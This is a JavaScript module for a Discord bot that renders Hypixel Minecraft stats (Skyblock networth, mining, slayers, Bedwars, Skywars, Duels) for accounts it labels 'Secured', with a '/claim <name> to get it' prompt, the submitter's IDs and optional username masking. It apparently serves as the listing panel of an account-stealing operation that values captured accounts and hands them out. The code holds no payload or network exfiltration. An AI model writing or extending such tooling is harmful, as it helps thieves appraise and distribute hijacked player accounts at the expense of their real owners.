const { ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, MessageFlags } = require('discord.js');
const getStats = require('./getStats');
const { getSkinAttachment } = require('../imageHandler');

function short(num) {
    if (!num) return '0';
    num = parseFloat(num);
    if (num >= 1_000_000_000) return (num / 1_000_000_000).toFixed(1) + 'B';
    if (num >= 1_000_000) return (num / 1_000_000).toFixed(1) + 'M';
    if (num >= 1_000) return (num / 1_000).toFixed(1) + 'K';
    return num.toString();
}

module.exports = async (name, settings = { sensored: false, list: 'skyblock', ping: '' }) => {
    console.log(`[LIST_PROFILE] Processing profile for ${settings.sensored ? 'HIDDEN' : name}`);
    const stats = await getStats(name);
    const skinAttachment = await getSkinAttachment(name, settings.sensored);

    // Function to hide username
    const hideText = (text) => {
        if (!settings.sensored || !text) return text;
        if (text.length <= 2) return '*'.repeat(text.length);
        return text[0] + '*'.repeat(text.length - 2) + text[text.length - 1];
    };

    const displayName = hideText(name);
    const sensored = settings.sensored ? '1' : '0';

    let embed = {
        title: `${displayName} | Secured`,
        description: `\`\`\`Account has been secured, /claim ${displayName} to get it!\`\`\``,
        author: {
            name: `${settings.userId ? hideText(settings.userId) : 'Unknown'} | ${settings.discordId || 'Unknown ID'}`
        },
        color: 2829617
    };

    // Only add thumbnail if skinAttachment is valid
    if (skinAttachment && skinAttachment.name) {
        embed.thumbnail = { url: 'attachment://' + skinAttachment.name };
    }

    const buildMsg = (embedObj, components) => {
        const msg = { embeds: [embedObj], components, flags: MessageFlags.Ephemeral };
        if (skinAttachment) msg.files = [skinAttachment];
        if (settings.ping) msg.content = settings.ping;
        return msg;
    };

    if (settings.list === 'skyblock') {
        let profile = {};
        const components = [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`skyblock|${name}|${sensored}`).setLabel('Skyblock').setStyle(ButtonStyle.Primary).setEmoji({ name: '🏝️' }).setDisabled(true),
                new ButtonBuilder().setCustomId(`bedwars|${name}|${sensored}`).setLabel('Bedwars').setStyle(ButtonStyle.Primary).setEmoji({ name: '🛏️' }),
                new ButtonBuilder().setCustomId(`skywars|${name}|${sensored}`).setLabel('Skywars').setStyle(ButtonStyle.Primary).setEmoji({ name: '☁️' }),
                new ButtonBuilder().setCustomId(`duels|${name}|${sensored}`).setLabel('Duels').setStyle(ButtonStyle.Primary).setEmoji({ name: '⚔️' }),
            ),
        ];

        const profilesMenu = new StringSelectMenuBuilder().setCustomId('profiles|' + sensored).setPlaceholder('Profile');
        if (Array.isArray(stats?.skyblock) && stats.skyblock.length !== 0) {
            const sortedProfiles = [...stats.skyblock].sort((a, b) => (b.current ? 1 : 0) - (a.current ? 1 : 0));
            for (const p of sortedProfiles) {
                profilesMenu.addOptions({
                    label: p.current ? `${p.name} (Selected)` : p.name,
                    value: `skyblock|${name}|${p.name}|${sensored}`,
                });
            }
            components.push(new ActionRowBuilder().addComponents(profilesMenu));

            if (!settings.profile) {
                profile = stats?.skyblock?.find(prof => prof.current === true);
            } else {
                profile = stats.skyblock.find(prof => prof.name === settings.profile);
            }
        }
        if (!profile) profile = stats?.skyblock?.[0] || {};

        const slayers = [
            profile?.slayers?.zombie || 0,
            profile?.slayers?.wolf || 0,
            profile?.slayers?.spider || 0,
            profile?.slayers?.enderman || 0,
            profile?.slayers?.blaze || 0,
            profile?.slayers?.vampire || 0
        ].join(' | ');

        embed.fields = [
            { name: ':island: Skill AVG', value: `${profile?.skills?.avg || 0}`, inline: true },
            { name: '\u200b', value: '\u200b', inline: true },
            { name: ':european_castle: Catacombs', value: `${profile?.catacombs?.level || 0}`, inline: true },
            { name: ':crossed_swords: Slayers   ', value: slayers, inline: true },
            { name: '\u200b', value: '\u200b', inline: true },
            { name: ':level_slider: Level', value: `${profile?.levels || 0}`, inline: true },
            { name: ':bank: Networth', value: `${short(profile?.networth || 0)} (${short(profile?.liquid || 0)} Coins)\n${short(profile?.unsoulboundNetworth || 0)} Unsoulbound Networth`, inline: false },
            { name: ':pick: Mining', value: `Heart of the Mountain: ${profile?.mining?.hotm || 0}\nMithril Powder: ${short(profile?.mining?.mithrilPowder || 0)}\nGemstone Powder: ${short(profile?.mining?.gemstonePowder || 0)}`, inline: false },
        ];

        return buildMsg(embed, components);

    } else if (settings.list === 'bedwars') {
        const bedwars = stats?.bedwars || {};
        embed.fields = [
            { name: 'Level', value: `${bedwars.level || 0}`, inline: true },
            { name: 'Coins', value: `${short(bedwars.coins || 0)}`, inline: true },
            { name: 'Kills', value: `${bedwars.kills || 0}`, inline: true },
            { name: 'Final Kills', value: `${bedwars.finalKills || 0}`, inline: true },
            { name: 'Deaths', value: `${bedwars.finalDeaths || 0}`, inline: true },
            { name: 'FKDR', value: `${bedwars.fkdr || 0}`, inline: true },
            { name: 'Wins', value: `${bedwars.wins || 0}`, inline: true },
            { name: 'Losses', value: `${bedwars.losses || 0}`, inline: true },
            { name: 'Win Rate', value: `${bedwars.wlr || 0}`, inline: true },
            { name: 'Beds Broken', value: `${bedwars.bedsBroken || 0}`, inline: true },
            { name: 'Beds Lost', value: `${bedwars.bedsLost || 0}`, inline: true },
            { name: 'BBLR', value: `${bedwars.bblr || 0}`, inline: true },
        ];

        const components = [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`skyblock|${name}|${sensored}`).setLabel('Skyblock').setStyle(ButtonStyle.Primary).setEmoji({ name: '🏝️' }),
                new ButtonBuilder().setCustomId(`bedwars|${name}|${sensored}`).setLabel('Bedwars').setStyle(ButtonStyle.Primary).setEmoji({ name: '🛏️' }).setDisabled(true),
                new ButtonBuilder().setCustomId(`skywars|${name}|${sensored}`).setLabel('Skywars').setStyle(ButtonStyle.Primary).setEmoji({ name: '☁️' }),
                new ButtonBuilder().setCustomId(`duels|${name}|${sensored}`).setLabel('Duels').setStyle(ButtonStyle.Primary).setEmoji({ name: '⚔️' }),
            ),
        ];

        return buildMsg(embed, components);

    } else if (settings.list === 'skywars') {
        const skywars = stats?.skywars || {};
        embed.fields = [
            { name: 'Levels', value: `${skywars.levels || 0}`, inline: true },
            { name: 'Coins', value: `${short(skywars.coins || 0)}`, inline: true },
            { name: 'Assists', value: `${skywars.assists || 0}`, inline: true },
            { name: 'Kills', value: `${skywars.kills || 0}`, inline: true },
            { name: 'Deaths', value: `${skywars.deaths || 0}`, inline: true },
            { name: 'KDR', value: `${skywars.kdr || 0}`, inline: true },
            { name: 'Wins', value: `${skywars.wins || 0}`, inline: true },
            { name: 'Losses', value: `${skywars.losses || 0}`, inline: true },
            { name: 'Win Rate', value: `${skywars.wlr || 0}`, inline: true },
        ];

        const components = [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`skyblock|${name}|${sensored}`).setLabel('Skyblock').setStyle(ButtonStyle.Primary).setEmoji({ name: '🏝️' }),
                new ButtonBuilder().setCustomId(`bedwars|${name}|${sensored}`).setLabel('Bedwars').setStyle(ButtonStyle.Primary).setEmoji({ name: '🛏️' }),
                new ButtonBuilder().setCustomId(`skywars|${name}|${sensored}`).setLabel('Skywars').setStyle(ButtonStyle.Primary).setEmoji({ name: '☁️' }).setDisabled(true),
                new ButtonBuilder().setCustomId(`duels|${name}|${sensored}`).setLabel('Duels').setStyle(ButtonStyle.Primary).setEmoji({ name: '⚔️' }),
            ),
        ];

        return buildMsg(embed, components);

    } else if (settings.list === 'duels') {
        const duels = stats?.duels || {};
        embed.fields = [
            { name: 'Title', value: `${duels.title || 'None'}`, inline: true },
            { name: 'Games Played', value: `${duels.totalGamesPlayed || 0}`, inline: true },
            { name: 'Coins', value: `${short(duels.coins || 0)}`, inline: true },
            { name: 'Kills', value: `${duels.kills || 0}`, inline: true },
            { name: 'Deaths', value: `${duels.deaths || 0}`, inline: true },
            { name: 'KLR', value: `${duels.KLRatio || 0}`, inline: true },
            { name: 'Wins', value: `${duels.wins || 0}`, inline: true },
            { name: 'Losses', value: `${duels.losses || 0}`, inline: true },
            { name: 'Win Rate', value: `${duels.WLRatio || 0}`, inline: true },
        ];

        const components = [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`skyblock|${name}|${sensored}`).setLabel('Skyblock').setStyle(ButtonStyle.Primary).setEmoji({ name: '🏝️' }),
                new ButtonBuilder().setCustomId(`bedwars|${name}|${sensored}`).setLabel('Bedwars').setStyle(ButtonStyle.Primary).setEmoji({ name: '🛏️' }),
                new ButtonBuilder().setCustomId(`skywars|${name}|${sensored}`).setLabel('Skywars').setStyle(ButtonStyle.Primary).setEmoji({ name: '☁️' }),
                new ButtonBuilder().setCustomId(`duels|${name}|${sensored}`).setLabel('Duels').setStyle(ButtonStyle.Primary).setEmoji({ name: '⚔️' }).setDisabled(true),
            ),
        ];

        return buildMsg(embed, components);
    }

    // Fallback — default to skyblock view
    return buildMsg(embed, []);
};